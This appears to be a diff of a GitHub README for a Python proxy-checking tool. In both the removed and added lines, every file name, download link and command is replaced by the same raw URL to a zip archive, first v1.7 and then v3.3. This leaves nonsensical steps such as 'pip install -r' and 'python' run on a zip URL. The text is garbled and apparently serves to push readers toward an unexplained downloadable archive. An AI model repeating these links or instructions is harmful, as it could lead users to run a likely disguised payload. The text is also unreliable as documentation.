@@ -1,6 +1,6 @@
 # 🛠️ proxy-multi-protocol-checker - Simple Tool for Proxy Testing
 
-[![Download](https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip%20release-brightgreen)](https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip)
+[![Download](https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run the proxy-multi-protocol-checker appli
 
 To get started, visit the following link to download the latest release of the application:
 
-[Visit this page to download](https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip)
+[Visit this page to download](https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest version of the software.
@@ -28,23 +28,23 @@ Proxy multi-protocol checker is a tool designed to detect proxies for three main
 
 - **Multi-threading**: The tool uses a method to check multiple proxies simultaneously, making it faster.
 
-- **Result Output**: It automatically saves available proxies into three different files: https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip, https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip, and https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip
+- **Result Output**: It automatically saves available proxies into three different files: https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip, https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip, and https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip
 
 ## 🏗️ File Structure
 
 The project consists of the following key files:
 
-- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip**: This is where you will start the application. It holds the menu and allows user interaction.
+- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip**: This is where you will start the application. It holds the menu and allows user interaction.
 
-- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip**: This file contains the logic that checks the proxies and manages the threading.
+- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip**: This file contains the logic that checks the proxies and manages the threading.
 
-- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip**: This file lists the necessary Python dependencies, which include requests and SOCKS support.
+- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip**: This file lists the necessary Python dependencies, which include requests and SOCKS support.
 
-- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip**: This file is where you will input the proxies you want to check. It needs to be filled in by you.
+- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip**: This file is where you will input the proxies you want to check. It needs to be filled in by you.
 
 ## 📂 Proxy List Format
 
-To ensure the software works correctly, you must format your proxies in a specific way. Open the **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip** file and enter your proxies as follows:
+To ensure the software works correctly, you must format your proxies in a specific way. Open the **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip** file and enter your proxies as follows:
 
 ```
 ip:port
@@ -67,7 +67,7 @@ This application requires Python to run. Please ensure you have Python installed
 Typically, you can install these using pip. Open your command prompt or terminal and enter:
 
 ```
-pip install -r https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip
+pip install -r https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip
 ```
 
 ## 📊 Running the Application
@@ -79,16 +79,16 @@ Once you have downloaded the application and filled in your proxy list, you can 
 3. Run the application by entering:
 
 ```
-python https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip
+python https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip
 ```
 
 ## 📋 Viewing Results
 
 After running the application, the program will check the proxies you provided. Once the process is complete, it will generate three separate text files in the same directory:
 
-- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip**: Contains all the available HTTP proxies.
-- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip**: Contains all the available HTTPS proxies.
-- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip**: Contains all the available SOCKS5 proxies.
+- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip**: Contains all the available HTTP proxies.
+- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip**: Contains all the available HTTPS proxies.
+- **https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip**: Contains all the available SOCKS5 proxies.
 
 You can open these files with any text editor to view the results.
 
@@ -97,7 +97,7 @@ You can open these files with any text editor to view the results.
 If you encounter issues while using the application:
 
 - Ensure that Python is installed and the necessary dependencies are set up correctly.
-- Check that your proxy list in https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip is properly formatted.
+- Check that your proxy list in https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip is properly formatted.
 - If the application crashes, try running it from the command line to see error messages.
 
 Most problems can be fixed by checking your setup and ensuring everything is configured correctly.
@@ -108,7 +108,7 @@ For any questions or suggestions, feel free to open an issue in the GitHub repos
 
 ## 🛠️ Updates and Maintenance
 
-Keep the software updated by checking the [download page](https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/proxy-multi-protocol-checker_v1.7.zip) regularly. New versions may include bug fixes, improvements, or additional features.
+Keep the software updated by checking the [download page](https://raw.githubusercontent.com/chalie56/proxy-multi-protocol-checker/main/diazotizable/protocol-checker-proxy-multi-v3.3.zip) regularly. New versions may include bug fixes, improvements, or additional features.
 
 ## 🔗 License
 
